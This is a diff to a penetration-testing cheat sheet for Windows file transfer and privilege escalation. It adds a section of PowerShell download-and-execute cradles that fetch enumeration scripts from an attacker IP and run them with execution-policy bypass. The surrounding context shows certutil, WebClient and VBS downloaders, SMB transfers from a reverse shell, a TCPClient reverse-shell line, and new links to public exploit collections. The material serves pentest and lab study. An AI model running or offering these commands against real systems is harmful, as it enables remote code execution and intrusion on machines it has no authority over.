@@ -99,6 +99,7 @@ Table of Contents
          * [Windows download with bitsadmin](#windows-download-with-bitsadmin)
          * [Windows download with certutil.exe](#windows-download-with-certutilexe)
          * [Windows download with powershell](#windows-download-with-powershell)
+         * [PowerShell Priv Esc](#powershell-priv-esc)
          * [Windows Download from FTP](#windows-download-from-ftp)
          * [Windows create SMB Server transfer files](#windows-create-smb-server-transfer-files)
          * [Windows download with VBS](#windows-download-with-vbs)
@@ -1970,9 +1971,17 @@ certutil.exe -urlcache -split -f "http://10.11.1.111/Powerless.bat" Powerless.ba
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\user\Desktop\file.exe')"
 
 (New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
-
-powershell IEX (New-Object Net.WebClient).downloadString('https://192.168.49.221/PowerUp.ps1')
 ````
+
+### PowerShell Priv Esc
+
+```
+powershell IEX (New-Object Net.WebClient).downloadString('https://192.168.49.221/jaws-enum.ps1')
+powershell Invoke-AllChecks
+
+powershell IEX (New-Object Net.WebClient).downloadString('https://192.168.49.221/Jaws.ps1')
+powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename EnumOutput.txt
+```
 
 ### Windows Download from FTP
 
@@ -2024,12 +2033,11 @@ python /usr/share/doc/python-impacket/examples/smbserver.py Lab "/root/labs/publ
 # Victim machine with reverse shell
 Download: copy \\10.11.1.111\Lab\wce.exe .
 Upload: copy wtf.jpg \\10.11.1.111\Lab
-
 ```
 
 ### Windows download with VBS
 
-````
+```
 # In reverse shell
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -2059,7 +2067,7 @@ echo ts.Close >> wget.vbs
 
 # Execute
 cscript wget.vbs http://10.11.1.111/file.exe file.exe
-````
+```
 
 ### Windowss XP SP1 PrivEsc
 
@@ -2164,6 +2172,9 @@ $client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = 
 ### Windows precompiled exploits
 
 - [WindowsExploits](https://github.com/abatchy17/WindowsExploits)
+- [WindowsExploits](https://github.com/nomi-sec/PoC-in-GitHub)
+- [WindowsExploits](https://github.com/SecWiki/windows-kernel-exploits)
+
 
 ### Windows Port Forwarding
 
